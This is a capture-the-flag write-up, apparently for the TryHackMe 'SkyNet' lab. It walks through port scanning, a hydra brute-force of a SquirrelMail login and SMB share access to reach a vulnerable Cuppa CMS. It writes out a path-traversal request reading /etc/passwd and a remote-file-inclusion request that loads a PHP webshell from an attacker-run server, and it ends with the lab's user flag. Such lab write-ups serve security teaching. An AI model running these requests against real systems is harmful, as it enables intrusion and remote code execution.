# SkyNet

## Recon

nmap revealed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 03:49 UTC
Nmap scan report for ip-10-10-20-144.eu-west-1.compute.internal (10.10.20.144)
Host is up (0.00057s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
MAC Address: 02:33:4B:B9:0C:CE (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds
```

So, a website, a mail server and samba shares.

dirb on the website revealed a mail application, squirrelmail, under /squirrelmail. The login page looked simple enough, but I needed a username and password.

enum4linux on the smb share revealed a username milesdyson and two shares: /anonymous and /milesdyson

## Hydra

Initially I tried hydra'ing the squirrel login using milesdyson and rockyou. While that was running, I connected to the anonymous share and poked about. Apart from a huge and funny collection of machine learning books, there was a note saying all passwords had been reset, and three log files, of which only the first (log1.txt) had any content.

The log file contained a list of permutations on the word 'terminator'. On a whim, since rockyou wasn't getting me anywhere, I tried using the log file as a password source instead. The first entry 'cyborg007haloterminator' worked :)

## Mail server, authed smb and hidden CMS

After logging in to squirrelmail, I found an email 'from skynet' that contained a new SMB password. I promptly used this with smbclient -U milesdyson to access the restricted share. In there, a level or two deep and buried in a huge set of markdown files I found a text file called important.txt

Inside this was a list of tasks:

```

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

I browsed to that path and found a hidden page on the main site. A dirb on the page revealed /45kra24zxs28v3yd/administrator, which when browsed to, revealed itself as 'Cuppa CMS'

## Remote file inclusion and shell

Cuppa is vulnerable to remote file inclusion, even unauthenticated, as described here on exploit-db: https://www.exploit-db.com/exploits/25971

I tested this with `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` and successfully got the contents of the local passwd file, all to the good. 

The exploit would include anything, even a url, so I downloaded a simple request CMD php shell from github, spun up a python3 -m http.server, and then tested command execution: `http://10.10.20.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?cmd=whoami&urlConfig=http://10.10.151.47:8000/easy-simple-php-webshell.php`. That magic `www-data` showed up.

Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: /home/milesdyson/user.txt. Success! `7ce5c2109a40f958099283600a9ae807`
